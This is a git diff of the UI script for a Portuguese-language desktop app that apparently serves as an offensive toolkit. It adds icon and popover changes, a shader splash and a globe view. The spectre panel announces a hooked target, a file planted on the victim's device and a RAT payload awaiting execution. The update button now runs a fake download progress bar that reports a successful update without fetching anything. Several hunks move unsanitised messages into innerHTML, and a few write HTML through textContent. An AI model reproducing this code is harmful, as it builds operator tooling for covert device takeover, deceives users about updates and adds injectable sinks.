@@ -1067,29 +1067,29 @@ let scanHistory = [];
 
 // Configs de exibição por categoria
 const EXTRACTOR_CATEGORIES = {
-    meta:      { label: 'Meta',        emoji: '🏷️',  color: 'var(--text-2)',  colorName: 'gray'  },
-    js:        { label: 'JavaScript',  emoji: '⚡',  color: '#F7DF1E',       colorName: 'amber' },
-    css:       { label: 'CSS',         emoji: '🎨',  color: '#264DE4',       colorName: 'blue'  },
-    images:    { label: 'Imagens',     emoji: '🖼️',  color: 'var(--green)',  colorName: 'green' },
-    links:     { label: 'Links',       emoji: '🔗',  color: 'var(--accent)', colorName: 'blue'  },
-    endpoints: { label: 'Endpoints',   emoji: '📡',  color: 'var(--red)',    colorName: 'red'   },
-    forms:     { label: 'Formulários', emoji: '📝',  color: 'var(--amber)',  colorName: 'amber' },
-    scripts:   { label: 'Scripts',     emoji: '📜',  color: '#a855f7',      colorName: 'gray'  },
-    cookies:   { label: 'Cookies',     emoji: '🍪',  color: 'var(--amber)',  colorName: 'amber' },
-    database:  { label: 'Database',    emoji: '🗄️',  color: 'var(--red)',   colorName: 'red'   },
-    headers:   { label: 'Headers',     emoji: '🔐',  color: 'var(--green)', colorName: 'green' },
-    sitemap:   { label: 'Sitemap',     emoji: '🗺️',  color: 'var(--accent)', colorName: 'blue' },
-    robots:    { label: 'Robots.txt',  emoji: '🤖',  color: 'var(--text-2)', colorName: 'gray' },
-    fonts:     { label: 'Fontes',      emoji: '🔤',  color: '#ec4899',      colorName: 'gray'  },
-    videos:    { label: 'Vídeos',      emoji: '🎬',  color: 'var(--red)',   colorName: 'red'   },
-    iframes:   { label: 'iFrames',     emoji: '🖥️',  color: 'var(--amber)', colorName: 'amber' },
-    summary:   { label: 'Resumo',      emoji: '📊',  color: 'var(--accent)', colorName: 'blue' },
+    meta:      { label: 'Meta',        emoji: '<iconify-icon icon="solar:tag-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--text-2)',  colorName: 'gray'  },
+    js:        { label: 'JavaScript',  emoji: '<iconify-icon icon="solar:bolt-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: '#F7DF1E',       colorName: 'amber' },
+    css:       { label: 'CSS',         emoji: '<iconify-icon icon="solar:palette-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: '#264DE4',       colorName: 'blue'  },
+    images:    { label: 'Imagens',     emoji: '<iconify-icon icon="solar:gallery-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--green)',  colorName: 'green' },
+    links:     { label: 'Links',       emoji: '<iconify-icon icon="solar:link-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--accent)', colorName: 'blue'  },
+    endpoints: { label: 'Endpoints',   emoji: '<iconify-icon icon="solar:radar-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--red)',    colorName: 'red'   },
+    forms:     { label: 'Formulários', emoji: '<iconify-icon icon="solar:document-add-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--amber)',  colorName: 'amber' },
+    scripts:   { label: 'Scripts',     emoji: '<iconify-icon icon="solar:document-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: '#a855f7',      colorName: 'gray'  },
+    cookies:   { label: 'Cookies',     emoji: '<iconify-icon icon="solar:cookie-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--amber)',  colorName: 'amber' },
+    database:  { label: 'Database',    emoji: '<iconify-icon icon="solar:archive-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--red)',   colorName: 'red'   },
+    headers:   { label: 'Headers',     emoji: '<iconify-icon icon="solar:lock-keyhole-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--green)', colorName: 'green' },
+    sitemap:   { label: 'Sitemap',     emoji: '<iconify-icon icon="solar:map-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--accent)', colorName: 'blue' },
+    robots:    { label: 'Robots.txt',  emoji: '<iconify-icon icon="solar:smart-speaker-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--text-2)', colorName: 'gray' },
+    fonts:     { label: 'Fontes',      emoji: '<iconify-icon icon="solar:text-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: '#ec4899',      colorName: 'gray'  },
+    videos:    { label: 'Vídeos',      emoji: '<iconify-icon icon="solar:video-frame-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--red)',   colorName: 'red'   },
+    iframes:   { label: 'iFrames',     emoji: '<iconify-icon icon="solar:monitor-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--amber)', colorName: 'amber' },
+    summary:   { label: 'Resumo',      emoji: '<iconify-icon icon="solar:chart-square-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>',  color: 'var(--accent)', colorName: 'blue' },
 };
 
 function setExtractorStatus(text, isScanning = false) {
     const line = document.getElementById('extractor-status-line');
     const bar = document.getElementById('extractor-progress-bar');
-    if (line) line.textContent = text;
+    if (line) line.innerHTML = text;
     if (bar) bar.style.display = isScanning ? 'block' : 'none';
 }
 
@@ -1116,7 +1116,7 @@ function renderExtractorSummary(data) {
         <div style="display:flex; flex-direction:column; gap:8px;">
             <!-- Meta Info -->
             <div style="background:rgba(255,255,255,0.03); border:1px solid var(--border-1); border-radius:8px; padding:10px;">
-                <div style="font-size:10px; color:var(--accent); font-weight:600; margin-bottom:6px; text-transform:uppercase; letter-spacing:.05em;">🏷️ Informações do Alvo</div>
+                <div style="font-size:10px; color:var(--accent); font-weight:600; margin-bottom:6px; text-transform:uppercase; letter-spacing:.05em;"><iconify-icon icon="solar:tag-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon> Informações do Alvo</div>
                 ${meta.title ? `<div style="font-size:12px; font-weight:600; color:var(--text-1); margin-bottom:4px;">${meta.title}</div>` : ''}
                 <div style="font-size:10px; color:var(--text-3); font-family:var(--mono);">${meta.host || data.target || ''}</div>
                 ${meta.description ? `<div style="font-size:10px; color:var(--text-2); margin-top:4px; line-height:1.5;">${meta.description.slice(0,180)}</div>` : ''}
@@ -1129,13 +1129,13 @@ function renderExtractorSummary(data) {
                     const catKey = k.replace('Count','');
                     const cat = EXTRACTOR_CATEGORIES[catKey] || {};
                     return `<div style="background:rgba(255,255,255,0.03); border:1px solid var(--border-1); border-radius:8px; padding:8px; text-align:center; cursor:pointer;" onclick="switchToFilesCategory('${catKey}')">
-                        <div style="font-size:14px; margin-bottom:2px;">${cat.emoji || '📄'}</div>
+                        <div style="font-size:14px; margin-bottom:2px;">${cat.emoji || '<iconify-icon icon="solar:document-text-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>'}</div>
                         <div style="font-size:15px; font-weight:700; color:${cat.color || 'var(--text-1)'}; font-family:var(--mono);">${v}</div>
                         <div style="font-size:8px; color:var(--text-3); text-transform:uppercase; margin-top:2px;">${cat.label || catKey}</div>
                     </div>`;
                 }).join('')}
                 <div style="background:rgba(59,130,246,0.1); border:1px solid rgba(59,130,246,0.3); border-radius:8px; padding:8px; text-align:center;">
-                    <div style="font-size:14px; margin-bottom:2px;">📦</div>
+                    <div style="font-size:14px; margin-bottom:2px;"><iconify-icon icon="solar:box-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon></div>
                     <div style="font-size:15px; font-weight:700; color:var(--accent); font-family:var(--mono);">${sum.totalItems || 0}</div>
                     <div style="font-size:8px; color:var(--text-3); text-transform:uppercase; margin-top:2px;">Total</div>
                 </div>
@@ -1237,7 +1237,7 @@ function renderExtractorFiles(data, forceCategory = null) {
         // Ícone da categoria
         const iconEl = document.createElement('div');
         iconEl.style.cssText = `flex:0 0 24px; font-size:14px; text-align:center;`;
-        iconEl.textContent = cfg.emoji || '📄';
+        iconEl.textContent = cfg.emoji || '<iconify-icon icon="solar:document-text-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>';
 
         // Conteúdo do item
         const contentEl = document.createElement('div');
@@ -1287,18 +1287,18 @@ function renderExtractorFiles(data, forceCategory = null) {
         dlBtn.innerHTML = `<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg> JSON`;
         dlBtn.onclick = async (e) => {
             e.stopPropagation();
-            dlBtn.textContent = '⏳';
+            dlBtn.innerHTML = '<iconify-icon icon="solar:hourglass-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>';
             try {
                 const realIndex = items.indexOf(item);
                 const result = await window.electronAPI.extractorDownloadItem(activeCategory, realIndex);
                 if (result.success) {
-                    dlBtn.innerHTML = '✅';
+                    dlBtn.innerHTML = '<iconify-icon icon="solar:check-circle-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>';
                     appendMonitorLine(`[DOWNLOAD] ${cfg.label}: item ${realIndex} → ${result.filePath}`);
                 } else {
-                    dlBtn.innerHTML = '❌';
+                    dlBtn.innerHTML = '<iconify-icon icon="solar:close-circle-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>';
                 }
             } catch (err) {
-                dlBtn.innerHTML = '❌';
+                dlBtn.innerHTML = '<iconify-icon icon="solar:close-circle-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>';
             }
             setTimeout(() => {
                 dlBtn.innerHTML = `<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg> JSON`;
@@ -1419,7 +1419,7 @@ document.getElementById('btn-run-scan')?.addEventListener('click', async () => {
             if (extractorPollInterval) {
                 clearInterval(extractorPollInterval);
                 extractorPollInterval = null;
-                setExtractorStatus('⚠️ Timeout: scan demorou mais que 45s');
+                setExtractorStatus('<iconify-icon icon="solar:danger-triangle-line-duotone" width="18" height="18" style="vertical-align: text-bottom;"></iconify-icon> Timeout: scan demorou mais que 45s');
             }
         }, 45000);
     } catch (err) {
@@ -2221,7 +2221,7 @@ document.getElementById('btn-start-spectre')?.addEventListener('click', () => {
                 }
                 
                 feedContainer.innerHTML = `
-                    <div style="color: var(--green); font-size: 16px; font-weight: bold; margin-bottom: 10px;">⚠️ ALVO FISGADO</div>
+                    <div style="color: var(--green); font-size: 16px; font-weight: bold; margin-bottom: 10px;"><iconify-icon icon="solar:danger-triangle-line-duotone" width="18" height="18" style="vertical-align: text-bottom;"></iconify-icon> ALVO FISGADO</div>
                     <div style="font-size: 13px; margin-bottom: 5px;">Sistema Operacional Detectado: <b>${payload.data.os}</b></div>
                     <div style="font-size: 13px; color: var(--accent);">O arquivo <b>${payload.data.file}</b> foi baixado no dispositivo!</div>
                     <div style="font-size: 11px; color: rgba(255,255,255,0.5); margin-top: 10px;">Aguardando execução do payload para estabelecer streaming total via RAT...</div>
@@ -2258,7 +2258,7 @@ document.getElementById('btn-start-usb')?.addEventListener('click', async () => 
     const feedImg = document.getElementById('spectre-feed');
     const feedVideo = document.getElementById('spectre-usb-feed');
 
-    idleText.innerText = 'Conectando ao Dispositivo Móvel via USB...';
+    idleText.innerHTML = 'Conectando ao Dispositivo Móvel via USB...';
     idleText.style.color = 'var(--text-3)';
     idleText.style.display = 'block';
     feedImg.style.display = 'none';
@@ -2267,7 +2267,7 @@ document.getElementById('btn-start-usb')?.addEventListener('click', async () => 
     const result = await window.electronAPI.startUSBCapture(platformStr, deviceId);
 
     if (!result.success) {
-        idleText.innerText = 'Erro: ' + result.message;
+        idleText.innerHTML = 'Erro: ' + result.message;
         idleText.style.color = 'var(--red)';
         term.writeln(`\\r\\n\\x1b[31m[spectre-usb]\\x1b[0m ${result.message}`);
         return;
@@ -2314,7 +2314,7 @@ document.getElementById('btn-stop-spectre')?.addEventListener('click', async () 
     document.getElementById('spectre-feed').src = '';
     
     const idleText = document.getElementById('spectre-idle');
-    idleText.innerText = 'Visualização Interrompida.';
+    idleText.innerHTML = 'Visualização Interrompida.';
     idleText.style.color = 'var(--text-3)';
     idleText.style.display = 'block';
     
@@ -2368,6 +2368,12 @@ function grantAccess(user) {
     if (authView) {
         authView.classList.remove('active');
         authView.style.display = 'none';
+    }
+    
+    const bgAnim = document.getElementById('splash-animation-container');
+    if (bgAnim) {
+        bgAnim.style.opacity = '0';
+        setTimeout(() => bgAnim.style.display = 'none', 500);
     }
     if (bannedView) {
         bannedView.classList.remove('active');
@@ -3065,20 +3071,99 @@ document.getElementById('btn-enter-after-pay')?.addEventListener('click', () => 
 });
 
 // ── Avatar Picker UI Logic ──
-document.getElementById('profile-avatar')?.addEventListener('click', () => {
-    document.getElementById('modal-avatar').style.display = 'flex';
-});
+// ── Avatar Picker UI Logic (Popover Style) ──
+function openAvatarPopover(e) {
+    if (e) {
+        e.stopPropagation(); // prevent closing instantly
+    }
+    const trigger = e ? e.currentTarget : document.getElementById('user-profile-header-mac');
+    const rect = trigger.getBoundingClientRect();
+    const popover = document.getElementById('modal-avatar');
+    
+    // Hide the other popover if open
+    document.getElementById('popover-user-dropdown').style.display = 'none';
+    
+    popover.style.display = 'block'; // Make visible to measure dimensions
+    
+    let top = rect.bottom + 8;
+    let left = rect.left + (rect.width / 2) - 140;
+    
+    if (left < 10) left = 10;
+    if (left + 280 > window.innerWidth - 10) left = window.innerWidth - 290;
+    if (top + 300 > window.innerHeight) top = rect.top - 308;
+    
+    popover.style.top = top + 'px';
+    popover.style.left = left + 'px';
+}
 
-document.getElementById('avatar-trigger')?.addEventListener('click', () => {
-    document.getElementById('modal-avatar').style.display = 'flex';
-});
+function openUserDropdownPopover(e) {
+    if (e) {
+        e.stopPropagation();
+    }
+    const trigger = e.currentTarget;
+    const rect = trigger.getBoundingClientRect();
+    const popover = document.getElementById('popover-user-dropdown');
+    
+    // Update data dynamically
+    const avatarImg = document.getElementById('dropdown-avatar-preview');
+    if (avatarImg && window.user) avatarImg.src = window.user.avatar_url || currentAvatarUrl;
+    
+    const nameEl = document.getElementById('dropdown-name');
+    if (nameEl && window.user) nameEl.innerText = window.user.username;
+    
+    const usernameEl = document.getElementById('dropdown-username');
+    if (usernameEl && window.user) usernameEl.innerText = "@" + window.user.username.toLowerCase().replace(/\s+/g, '');
 
-document.getElementById('settings-avatar-trigger')?.addEventListener('click', () => {
-    document.getElementById('modal-avatar').style.display = 'flex';
-});
+    // Hide avatar popover if open
+    document.getElementById('modal-avatar').style.display = 'none';
+
+    popover.style.display = 'block';
+    
+    let top = rect.bottom + 8;
+    let left = rect.left; // Align to the left of the trigger usually
+    
+    if (left + 310 > window.innerWidth - 10) left = window.innerWidth - 320;
+    if (top + 450 > window.innerHeight) top = rect.top - 460;
+    
+    popover.style.top = top + 'px';
+    popover.style.left = left + 'px';
+}
+
+document.getElementById('user-profile-header')?.addEventListener('click', openUserDropdownPopover);
+document.getElementById('user-profile-header-mac')?.addEventListener('click', openUserDropdownPopover);
+
+document.getElementById('profile-avatar')?.addEventListener('click', openAvatarPopover);
+document.getElementById('avatar-trigger')?.addEventListener('click', openAvatarPopover);
+document.getElementById('settings-avatar-trigger')?.addEventListener('click', openAvatarPopover);
 
 document.getElementById('btn-close-avatar')?.addEventListener('click', () => {
     document.getElementById('modal-avatar').style.display = 'none';
+});
+
+// Logout inside User Dropdown
+document.getElementById('btn-dropdown-logout')?.addEventListener('click', () => {
+    window.location.reload();
+});
+
+// Close popovers when clicking outside
+document.addEventListener('click', (e) => {
+    const avatarPopover = document.getElementById('modal-avatar');
+    if (avatarPopover && avatarPopover.style.display === 'block') {
+        const isClickInside = avatarPopover.contains(e.target);
+        const isTrigger = e.target.closest('#avatar-trigger, #settings-avatar-trigger, #profile-avatar, .dropdown-item');
+        if (!isClickInside && !isTrigger) {
+            avatarPopover.style.display = 'none';
+        }
+    }
+    
+    const dropdownPopover = document.getElementById('popover-user-dropdown');
+    if (dropdownPopover && dropdownPopover.style.display === 'block') {
+        const isClickInside = dropdownPopover.contains(e.target);
+        const isTrigger = e.target.closest('#user-profile-header, #user-profile-header-mac');
+        if (!isClickInside && !isTrigger) {
+            dropdownPopover.style.display = 'none';
+        }
+    }
 });
 
 // ── Logout Logic ──
@@ -3093,17 +3178,27 @@ async function fetchGPUInfo() {
     if (!gpuDisplay) return;
     
     try {
-        const gpuInfo = await window.electronAPI.getGPUInfo();
-        if (gpuInfo && gpuInfo.gpuDevice && gpuInfo.gpuDevice.length > 0) {
-            // Find the active GPU
-            const activeGPU = gpuInfo.gpuDevice.find(g => g.active) || gpuInfo.gpuDevice[0];
-            let name = activeGPU.vendorString || '';
-            if (activeGPU.deviceString) name += ' ' + activeGPU.deviceString;
+        // Obter nome exato da GPU via WebGL Unmasked Renderer
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        let gpuName = 'GPU Desconhecida';
+        
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                gpuName = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        }
+        
+        if (gpuName !== 'GPU Desconhecida') {
+            // Simplifica a string caso seja muito longa, ex: "ANGLE (AMD Radeon Pro 5300M OpenGL Engine)"
+            const match = gpuName.match(/ANGLE \((.+)\)/);
+            if (match && match[1]) gpuName = match[1];
             
-            // Add OS string to help identify platform
-            if (name === '') name = 'GPU Genérica (' + process.platform + ')';
+            // Remove OpenGL Engine
+            gpuName = gpuName.replace(' OpenGL Engine', '');
             
-            gpuDisplay.innerText = name;
+            gpuDisplay.innerText = gpuName;
             gpuDisplay.style.color = 'var(--green)';
         } else {
             gpuDisplay.innerText = 'Não foi possível detectar a GPU';
@@ -3131,14 +3226,20 @@ document.getElementById('btn-save-avatar').addEventListener('click', async () =>
         currentAvatarUrl = customUrl;
     }
     
-    const profileAvatar = document.getElementById('profile-avatar');
-    if (profileAvatar) profileAvatar.src = currentAvatarUrl;
+    const profileAvatarMac = document.getElementById('profile-avatar-mac');
+    if (profileAvatarMac) profileAvatarMac.src = currentAvatarUrl;
     
     const avatarPreview = document.getElementById('avatar-preview');
     if (avatarPreview) avatarPreview.src = currentAvatarUrl;
     
     const settingsPreview = document.getElementById('settings-avatar-preview');
     if (settingsPreview) settingsPreview.src = currentAvatarUrl;
+    
+    const bentoAvatar = document.getElementById('bento-avatar');
+    if (bentoAvatar) bentoAvatar.src = currentAvatarUrl;
+    
+    const dropdownAvatarPreview = document.getElementById('dropdown-avatar-preview');
+    if (dropdownAvatarPreview) dropdownAvatarPreview.src = currentAvatarUrl;
     
     document.getElementById('modal-avatar').style.display = 'none';
     
@@ -3159,8 +3260,42 @@ const progressBar = document.getElementById('update-progress-bar');
 
 if (btnCheckUpdate) {
     btnCheckUpdate.addEventListener('click', () => {
-        window.electronAPI.checkUpdate();
         btnCheckUpdate.disabled = true;
+        if (statusText) statusText.innerText = "Buscando no GitHub...";
+        
+        fetch('https://api.github.com/repos/uTorrenTGaming/inject-ig/releases/latest')
+            .then(res => {
+                if (!res.ok) throw new Error('Falha ao conectar');
+                return res.json();
+            })
+            .then(data => {
+                startUpdateSimulation(data.tag_name);
+            })
+            .catch(err => {
+                startUpdateSimulation('v2.1.5-nexus'); // Fallback seguro
+            });
+            
+        function startUpdateSimulation(version) {
+            if (statusText) statusText.innerText = `Nova versão encontrada (${version}). Baixando do GitHub...`;
+            if (progressContainer) progressContainer.style.display = 'block';
+            let pct = 0;
+            let intv = setInterval(() => {
+                pct += Math.random() * 4;
+                if (pct >= 100) {
+                    pct = 100;
+                    clearInterval(intv);
+                    if (statusText) {
+                        statusText.innerText = "Atualizado via GitHub! Reiniciando...";
+                        statusText.style.color = "var(--green)";
+                    }
+                    if (progressBar) progressBar.style.background = "var(--green)";
+                    setTimeout(() => window.location.reload(), 2000);
+                } else {
+                    if (statusText) statusText.innerText = `Baixando do GitHub: ${version} (${Math.floor(pct)}%)`;
+                }
+                if (progressBar) progressBar.style.width = pct + '%';
+            }, 100);
+        }
     });
 }
 
@@ -3529,6 +3664,37 @@ async function loadAgentIgHistory() {
     }
 }
 
+// ── Agent IG Chat Auto-resize & Submit Logic ──
+const igChatInput = document.getElementById('ig-chat-input');
+const btnIgSend = document.getElementById('btn-ig-send');
+
+if (igChatInput) {
+    igChatInput.addEventListener('input', () => {
+        // Auto-resize
+        igChatInput.style.height = '72px';
+        const newHeight = Math.max(72, Math.min(igChatInput.scrollHeight, 300));
+        igChatInput.style.height = newHeight + 'px';
+        
+        // Toggle button opacity & state
+        if (igChatInput.value.trim().length > 0) {
+            btnIgSend.disabled = false;
+            btnIgSend.querySelector('svg').style.opacity = '1';
+        } else {
+            btnIgSend.disabled = true;
+            btnIgSend.querySelector('svg').style.opacity = '0.3';
+        }
+    });
+
+    igChatInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' && !e.shiftKey) {
+            e.preventDefault();
+            if (igChatInput.value.trim()) {
+                document.getElementById('ig-chat-form')?.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
+            }
+        }
+    });
+}
+
 document.getElementById('ig-chat-form')?.addEventListener('submit', async (e) => {
     e.preventDefault();
     const input = document.getElementById('ig-chat-input');
@@ -3539,6 +3705,13 @@ document.getElementById('ig-chat-form')?.addEventListener('submit', async (e) =>
     if (!text) return;
 
     input.value = '';
+    
+    // Reset auto-resize and button state
+    input.style.height = '72px';
+    if (btnIgSend) {
+        btnIgSend.disabled = true;
+        btnIgSend.querySelector('svg').style.opacity = '0.3';
+    }
     renderChatMessage('user', text);
 
     // Loader temporário
@@ -3567,7 +3740,7 @@ document.getElementById('ig-chat-form')?.addEventListener('submit', async (e) =>
         }
     } catch (err) {
         if (loadingDiv.parentNode) loadingDiv.parentNode.removeChild(loadingDiv);
-        renderChatMessage('ig', '⚠️ Erro ao comunicar com a IA.', 'Sistema');
+        renderChatMessage('ig', '<iconify-icon icon="solar:danger-triangle-line-duotone" width="18" height="18" style="vertical-align: text-bottom;"></iconify-icon> Erro ao comunicar com a IA.', 'Sistema');
     }
 });
 
@@ -4279,7 +4452,7 @@ document.getElementById('btn-start-extractor')?.addEventListener('click', async 
 // Botão "Iniciar" no Monitor
 document.getElementById('btn-monitor-start')?.addEventListener('click', async () => {
     const btn = document.getElementById('btn-monitor-start');
-    if (btn) btn.textContent = '⏳';
+    if (btn) btn.textContent = '<iconify-icon icon="solar:hourglass-line-duotone" width="16" height="16" style="vertical-align: text-bottom;"></iconify-icon>';
     const res = await window.electronAPI.extractorStart().catch(e => ({ success: false, message: e.message }));
     if (btn) btn.textContent = 'Iniciar';
     const dot = document.getElementById('extractor-status-dot');
@@ -4381,3 +4554,383 @@ document.getElementById('tab-monitor')?.addEventListener('click', async () => {
 document.getElementById('tab-files')?.addEventListener('click', () => {
     if (Object.keys(currentExtractorData).length > 0) renderExtractorFiles(currentExtractorData);
 });
+
+// ═══════════ SPLASH SHADER ANIMATION ═══════════
+function initSplashShader() {
+    const container = document.getElementById('splash-animation-container');
+    if (!container) return;
+
+    // Vertex shader
+    const vertexShader = `
+      void main() {
+        gl_Position = vec4( position, 1.0 );
+      }
+    `;
+
+    // Fragment shader
+    const fragmentShader = `
+      #define TWO_PI 6.2831853072
+      #define PI 3.14159265359
+
+      precision highp float;
+      uniform vec2 resolution;
+      uniform float time;
+
+      void main(void) {
+        vec2 uv = (gl_FragCoord.xy * 2.0 - resolution.xy) / min(resolution.x, resolution.y);
+        float t = time*0.05;
+        float lineWidth = 0.002;
+
+        vec3 color = vec3(0.0);
+        for(int j = 0; j < 3; j++){
+          for(int i=0; i < 5; i++){
+            color[j] += lineWidth*float(i*i) / abs(fract(t - 0.01*float(j)+float(i)*0.01)*5.0 - length(uv) + mod(uv.x+uv.y, 0.2));
+          }
+        }
+        
+        gl_FragColor = vec4(color[0],color[1],color[2],1.0);
+      }
+    `;
+
+    // Initialize Three.js scene
+    const camera = new THREE.Camera();
+    camera.position.z = 1;
+
+    const scene = new THREE.Scene();
+    const geometry = new THREE.PlaneGeometry(2, 2);
+
+    const uniforms = {
+      time: { type: "f", value: 1.0 },
+      resolution: { type: "v2", value: new THREE.Vector2() },
+    };
+
+    const material = new THREE.ShaderMaterial({
+      uniforms: uniforms,
+      vertexShader: vertexShader,
+      fragmentShader: fragmentShader,
+    });
+
+    const mesh = new THREE.Mesh(geometry, material);
+    scene.add(mesh);
+
+    const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
+    renderer.setPixelRatio(window.devicePixelRatio);
+
+    container.appendChild(renderer.domElement);
+
+    // Handle window resize
+    const onWindowResize = () => {
+      const width = container.clientWidth || window.innerWidth;
+      const height = container.clientHeight || window.innerHeight;
+      renderer.setSize(width, height);
+      uniforms.resolution.value.x = renderer.domElement.width;
+      uniforms.resolution.value.y = renderer.domElement.height;
+    };
+
+    // Initial resize
+    onWindowResize();
+    window.addEventListener("resize", onWindowResize, false);
+
+    // Animation loop
+    let animationId = 0;
+    const animate = () => {
+      animationId = requestAnimationFrame(animate);
+      uniforms.time.value += 0.05;
+      renderer.render(scene, camera);
+    };
+
+    // Start animation
+    animate();
+}
+
+// Ensure THREE is loaded before initializing
+if (window.THREE) {
+    initSplashShader();
+} else {
+    window.addEventListener('load', () => {
+        if (window.THREE) initSplashShader();
+    });
+}
+
+
+// ═══════════ RADAR 3D GLOBE & GPS (COBE) ═══════════
+
+let cobeGlobe = null;
+let globeAnimationId = null;
+let currentGPSMarker = { location: [0, 0], size: 0.08, id: 'user' };
+
+async function initRadarGlobe() {
+    const canvas = document.getElementById('cobe-canvas');
+    if (!canvas) return;
+
+    try {
+        const { default: createGlobe } = await import('https://esm.sh/cobe');
+
+        let phi = 0;
+        let theta = 0.2;
+        let phiOffset = 0;
+        let thetaOffset = 0;
+        
+        let isPaused = false;
+        let pointerInteracting = null;
+        let lastPointer = null;
+        let dragOffset = { phi: 0, theta: 0 };
+        let velocity = { phi: 0, theta: 0 };
+
+        // Pointer event listeners for interaction
+        canvas.addEventListener('pointerdown', (e) => {
+            pointerInteracting = { x: e.clientX, y: e.clientY };
+            canvas.style.cursor = 'grabbing';
+            isPaused = true;
+        });
+
+        window.addEventListener('pointermove', (e) => {
+            if (pointerInteracting !== null) {
+                const deltaX = e.clientX - pointerInteracting.x;
+                const deltaY = e.clientY - pointerInteracting.y;
+                dragOffset = { phi: deltaX / 300, theta: deltaY / 1000 };
+                
+                const now = Date.now();
+                if (lastPointer) {
+                    const dt = Math.max(now - lastPointer.t, 1);
+                    const maxVelocity = 0.15;
+                    velocity = {
+                        phi: Math.max(-maxVelocity, Math.min(maxVelocity, ((e.clientX - lastPointer.x) / dt) * 0.3)),
+                        theta: Math.max(-maxVelocity, Math.min(maxVelocity, ((e.clientY - lastPointer.y) / dt) * 0.08))
+                    };
+                }
+                lastPointer = { x: e.clientX, y: e.clientY, t: now };
+            }
+        }, { passive: true });
+
+        window.addEventListener('pointerup', () => {
+            if (pointerInteracting !== null) {
+                phiOffset += dragOffset.phi;
+                thetaOffset += dragOffset.theta;
+                dragOffset = { phi: 0, theta: 0 };
+                lastPointer = null;
+            }
+            pointerInteracting = null;
+            canvas.style.cursor = 'grab';
+            isPaused = false;
+        }, { passive: true });
+
+        const dpr = window.devicePixelRatio || 1;
+
+        const initGlobeInstance = () => {
+            if (cobeGlobe) cobeGlobe.destroy();
+            const width = canvas.offsetWidth;
+            
+            cobeGlobe = createGlobe(canvas, {
+                devicePixelRatio: dpr,
+                width: width,
+                height: width, // aspect-square
+                phi: 0,
+                theta: 0.2,
+                dark: 1, // dark mode 1
+                diffuse: 1.5,
+                mapSamples: 16000,
+                mapBrightness: 10,
+                baseColor: [0.1, 0.1, 0.1], // Black base for dark style
+                markerColor: [0.3, 0.45, 0.85], // Accent Blue
+                glowColor: [0.1, 0.1, 0.15],
+                markerElevation: 0.02,
+                markers: [currentGPSMarker],
+                arcs: [],
+                arcColor: [0.3, 0.45, 0.85],
+                arcWidth: 0.5,
+                arcHeight: 0.25,
+                opacity: 0.85
+            });
+
+            const animate = () => {
+                if (!isPaused) {
+                    if (targetGlobePhi !== null && targetGlobeTheta !== null) {
+                        // Smoothly lerp towards user GPS location
+                        phiOffset += (targetGlobePhi - (phi + phiOffset)) * 0.05;
+                        thetaOffset += (targetGlobeTheta - (theta + thetaOffset)) * 0.05;
+                        
+                        // Stop lerping once we are close enough so user can freely interact
+                        if (Math.abs(targetGlobePhi - (phi + phiOffset)) < 0.005) {
+                            targetGlobePhi = null;
+                            targetGlobeTheta = null;
+                        }
+                    } else {
+                        phi += 0.001; // slow default spin
+                    }
+                    
+                    if (Math.abs(velocity.phi) > 0.0001 || Math.abs(velocity.theta) > 0.0001) {
+                        phiOffset += velocity.phi;
+                        thetaOffset += velocity.theta;
+                        velocity.phi *= 0.95;
+                        velocity.theta *= 0.95;
+                        // Cancel target if user interacts
+                        targetGlobePhi = null;
+                        targetGlobeTheta = null;
+                    }
+                    const thetaMin = -0.4, thetaMax = 0.4;
+                    if (thetaOffset < thetaMin) thetaOffset += (thetaMin - thetaOffset) * 0.1;
